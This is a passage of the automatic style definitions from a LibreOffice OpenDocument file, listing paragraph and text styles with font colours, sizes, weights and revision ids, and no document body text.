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f46fd" officeooo:paragraph-rsid="000f46fd"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="000f46fd" officeooo:paragraph-rsid="000f46fd" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#009900" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="000f46fd" officeooo:paragraph-rsid="000f46fd" style:font-size-asian="10pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#009900" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="000f46fd" officeooo:paragraph-rsid="0016f455" style:font-size-asian="10pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#009900" officeooo:rsid="000f46fd" officeooo:paragraph-rsid="000f46fd"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" fo:font-size="10pt" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="000f46fd" officeooo:paragraph-rsid="000f46fd" style:font-size-asian="10pt" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-size-complex="10pt" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" fo:font-size="12pt" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="000f46fd" officeooo:paragraph-rsid="000f46fd" style:font-size-asian="12pt" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" fo:font-size="12pt" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="000f46fd" officeooo:paragraph-rsid="000f46fd" style:font-size-asian="12pt" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-style-complex="italic" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" fo:font-size="12pt" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="000f46fd" officeooo:paragraph-rsid="0016f455" style:font-size-asian="12pt" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-style-complex="italic" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P10" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" fo:font-size="12pt" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="00114058" officeooo:paragraph-rsid="00114058" style:font-size-asian="12pt" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-style-complex="italic" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P11" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" fo:font-size="12pt" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="0012d1a6" officeooo:paragraph-rsid="0012d1a6" style:font-size-asian="12pt" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-style-complex="italic" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" fo:font-size="12pt" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="00138d2d" officeooo:paragraph-rsid="00138d2d" style:font-size-asian="12pt" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-style-complex="italic" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" fo:font-size="12pt" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="0016f455" officeooo:paragraph-rsid="0016f455" style:font-size-asian="12pt" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-style-complex="italic" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" fo:font-size="12pt" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="001a6929" officeooo:paragraph-rsid="001a6929" style:font-size-asian="12pt" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-style-complex="italic" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P15" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" fo:font-size="12pt" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="001dd342" officeooo:paragraph-rsid="001dd342" style:font-size-asian="12pt" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-style-complex="italic" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P16" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" fo:font-size="12pt" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="000f46fd" officeooo:paragraph-rsid="000f46fd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text-properties fo:color="#000000" fo:font-size="12pt" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="000f46fd" officeooo:paragraph-rsid="0016f455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text-properties fo:color="#000000" fo:font-size="12pt" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="001116df" officeooo:paragraph-rsid="001116df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text-properties fo:color="#000000" fo:font-size="12pt" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="0012d1a6" officeooo:paragraph-rsid="0012d1a6" style:font-size-asian="12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style:text-properties fo:color="#000000" fo:font-size="12pt" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="0016f455" officeooo:paragraph-rsid="0016f455" style:font-size-asian="12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style:text-properties fo:color="#000000" fo:font-size="12pt" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="001a6929" officeooo:paragraph-rsid="001a6929" style:font-size-asian="12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>
      <style:text-properties fo:color="#000000" fo:font-size="12pt" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="001dd342" officeooo:paragraph-rsid="001dd342" style:font-size-asian="12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>
      <style:text-properties fo:color="#000000" fo:font-size="12pt" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="000f46fd" officeooo:paragraph-rsid="000f46fd" style:font-size-asian="12pt" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P24" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" fo:font-size="12pt" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="0016f455" officeooo:paragraph-rsid="0016f455" style:font-size-asian="12pt" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P25" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" fo:font-size="12pt" fo:font-weight="normal" officeooo:rsid="00138d2d" officeooo:paragraph-rsid="0012d1a6" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P26" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" fo:font-size="12pt" fo:font-weight="normal" officeooo:rsid="0016f455" officeooo:paragraph-rsid="0016f455" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P27" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#0066cc" fo:font-size="10pt" officeooo:rsid="000f46fd" officeooo:paragraph-rsid="0011ef1f" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P28" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#0066cc" fo:font-size="10pt" officeooo:rsid="000f46fd" officeooo:paragraph-rsid="0012d1a6" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P29" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#0066cc" fo:font-size="10pt" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="000f46fd" officeooo:paragraph-rsid="000f46fd" style:font-size-asian="10pt" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-size-complex="10pt" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P30" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#0066cc" fo:font-size="10pt" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="000f46fd" officeooo:paragraph-rsid="00190ee3" style:font-size-asian="10pt" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-size-complex="10pt" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P31" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#0066cc" fo:font-size="10pt" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="000f46fd" officeooo:paragraph-rsid="000f46fd" style:font-size-asian="10pt" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-style-complex="italic" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P32" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#0066cc" fo:font-size="10pt" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="000f46fd" officeooo:paragraph-rsid="00114058" style:font-size-asian="10pt" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-style-complex="italic" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P33" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#0066cc" fo:font-size="10pt" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="000f46fd" officeooo:paragraph-rsid="0011ef1f" style:font-size-asian="10pt" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-size-complex="10pt" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P34" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#0066cc" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="000f46fd" officeooo:paragraph-rsid="0011ef1f" style:font-size-asian="10pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P35" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#0066cc" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="000f46fd" officeooo:paragraph-rsid="0012d1a6" style:font-size-asian="10pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P36" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#0066cc" fo:font-size="12pt" officeooo:rsid="000f46fd" officeooo:paragraph-rsid="000f46fd" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P37" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#0066cc" fo:font-size="12pt" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="000f46fd" officeooo:paragraph-rsid="00138d2d" style:font-size-asian="12pt" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P38" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#0066cc" fo:font-size="12pt" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="000f46fd" officeooo:paragraph-rsid="000f46fd" style:font-size-asian="12pt" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P39" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#0066cc" fo:font-size="12pt" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="000f46fd" officeooo:paragraph-rsid="0016f455" style:font-size-asian="12pt" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P40" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#0066cc" fo:font-size="12pt" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="0016f455" officeooo:paragraph-rsid="0016f455" style:font-size-asian="12pt" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P41" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#0066cc" fo:font-size="12pt" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="000f46fd" officeooo:paragraph-rsid="000f46fd" style:font-size-asian="12pt" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-style-complex="italic" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P42" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#0066cc" fo:font-size="12pt" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="000f46fd" officeooo:paragraph-rsid="00138d2d" style:font-size-asian="12pt" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-style-complex="italic" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P43" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#0066cc" fo:font-size="12pt" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="000f46fd" officeooo:paragraph-rsid="000f46fd" style:font-size-asian="12pt" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P44" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#0066cc" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="000f46fd" officeooo:paragraph-rsid="00138d2d" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P45" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#0066cc" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="000f46fd" officeooo:paragraph-rsid="0016f455" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P46" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#0066cc" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="000f46fd" officeooo:paragraph-rsid="001a6929" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P47" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="000d0089" officeooo:paragraph-rsid="00138d2d"/>
    </style:style>
    <style:style style:name="P48" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0004c335" officeooo:paragraph-rsid="00138d2d"/>
    </style:style>
    <style:style style:name="P49" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00138d2d" officeooo:paragraph-rsid="00138d2d"/>
    </style:style>
    <style:style style:name="P50" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="000f46fd" officeooo:paragraph-rsid="000f46fd" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P51" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#004586" fo:font-size="12pt" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="0012d1a6" officeooo:paragraph-rsid="0012d1a6" style:font-size-asian="12pt" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-style-complex="italic" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P52" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#004586" fo:font-size="12pt" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="001a6929" officeooo:paragraph-rsid="001a6929" style:font-size-asian="12pt" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-style-complex="italic" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P53" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#0066cc" fo:font-size="10pt" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="00138d2d" officeooo:paragraph-rsid="00138d2d" style:font-size-asian="10pt" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-style-complex="italic" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P54" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties officeooo:rsid="0004c335" officeooo:paragraph-rsid="00138d2d"/>
    </style:style>
    <style:style style:name="P55" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" fo:font-size="10pt" fo:font-weight="normal" officeooo:rsid="0004c335" officeooo:paragraph-rsid="00138d2d" style:font-size-asian="10pt" style:font-weight-asian="normal" style:font-size-complex="10pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P56" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" fo:font-size="10pt" fo:font-weight="normal" officeooo:rsid="000f46fd" officeooo:paragraph-rsid="00138d2d" style:font-size-asian="10pt" style:font-weight-asian="normal" style:font-size-complex="10pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P57" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#004586" fo:font-size="12pt" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="001dd342" officeooo:paragraph-rsid="001dd342" style:font-size-asian="12pt" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-style-complex="italic" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P58" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#004586" fo:font-size="12pt" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="001dd342" officeooo:paragraph-rsid="001dd342" style:font-size-asian="12pt" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P59" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#004586" fo:font-size="10pt" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="001dd342" officeooo:paragraph-rsid="001dd342" style:font-size-asian="10pt" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-style-complex="italic" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P60" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#004586" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="001f9189" officeooo:paragraph-rsid="001f9189" style:font-size-asian="10pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P61" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#004586" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="001f9189" officeooo:paragraph-rsid="00207260" style:font-size-asian="10pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P62" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#004586" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="00207260" officeooo:paragraph-rsid="00207260" style:font-size-asian="10pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P63" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#009900" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="000f46fd" officeooo:paragraph-rsid="000f46fd" style:font-size-asian="10pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P64" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#009900" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="001f9189" officeooo:paragraph-rsid="001f9189" style:font-size-asian="10pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P65" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#009900" fo:font-size="10pt" officeooo:rsid="000f46fd" officeooo:paragraph-rsid="001f9189" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P66" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#c5000b" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="001f9189" officeooo:paragraph-rsid="001f9189" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P67" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#0066cc" fo:font-size="12pt" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="000f46fd" officeooo:paragraph-rsid="000f46fd" style:font-size-asian="12pt" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-style-complex="italic" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P68" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#0066cc" fo:font-size="12pt" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="000f46fd" officeooo:paragraph-rsid="00138d2d" style:font-size-asian="12pt" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-style-complex="italic" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P69" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#0066cc" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="001f9189" officeooo:paragraph-rsid="001f9189" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P70" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#0066cc" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="000f46fd" officeooo:paragraph-rsid="00138d2d" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P71" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#0066cc" fo:font-size="12pt" officeooo:rsid="000f46fd" officeooo:paragraph-rsid="00138d2d" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P72" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#0066cc" fo:font-size="12pt" officeooo:rsid="00138d2d" officeooo:paragraph-rsid="001f9189" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P73" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#0066cc" fo:font-size="12pt" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="00138d2d" officeooo:paragraph-rsid="001f9189" style:font-size-asian="12pt" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P74" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#0066cc" fo:font-size="10pt" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="001f9189" officeooo:paragraph-rsid="00207260" style:font-size-asian="10pt" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P75" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00138d2d" officeooo:paragraph-rsid="001f9189"/>
    </style:style>
    <style:style style:name="P76" style:family="paragraph">
      <style:paragraph-properties fo:text-align="center"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties officeooo:rsid="000f46f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f4a1b" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="001f9189" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="000f46fd" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="00207260" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties fo:font-size="10pt" fo:font-weight="bold" style:font-size-asian="10pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T8" style:family="text">
      <style:text-properties fo:color="#004586"/>
    </style:style>
    <style:style style:name="T9" style:family="text">
      <style:text-properties fo:color="#004586" fo:font-style="italic" fo:font-weight="bold" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-style-complex="italic" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T10" style:family="text">
      <style:text-properties fo:color="#004586" fo:font-size="12pt" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="001a6929" style:font-size-asian="12pt" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T11" style:family="text">
      <style:text-properties fo:color="#004586" fo:font-size="12pt" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="001f9189" style:font-size-asian="12pt" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T12" style:family="text">
      <style:text-properties fo:color="#004586" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="001af893" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T13" style:family="text">
      <style:text-properties fo:color="#004586" fo:font-style="normal" officeooo:rsid="001a6929" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="T14" style:family="text">
      <style:text-properties fo:color="#004586" officeooo:rsid="001be81b"/>
    </style:style>
    <style:style style:name="T15" style:family="text">
      <style:text-properties fo:color="#004586" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="001f9189" style:font-size-asian="10pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T16" style:family="text">
      <style:text-properties fo:color="#004586" officeooo:rsid="001f9189"/>
    </style:style>
    <style:style style:name="T17" style:family="text">
      <style:text-properties fo:color="#0066cc"/>
    </style:style>
    <style:style style:name="T18" style:family="text">
      <style:text-properties fo:color="#0066cc" fo:font-weight="bold" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T19" style:family="text">
      <style:text-properties fo:color="#0066cc" fo:font-weight="bold" officeooo:rsid="0016f455" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T20" style:family="text">
      <style:text-properties fo:color="#0066cc" fo:font-style="italic" fo:font-weight="bold" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-style-complex="italic" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T21" style:family="text">
      <style:text-properties fo:color="#0066cc" fo:font-size="12pt" fo:font-weight="bold" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T22" style:family="text">
      <style:text-properties fo:color="#0066cc" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="000f46fd" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T23" style:family="text">
      <style:text-properties fo:color="#0066cc" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="001be81b" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T24" style:family="text">
      <style:text-properties fo:color="#0066cc" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="001f9189" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T25" style:family="text">
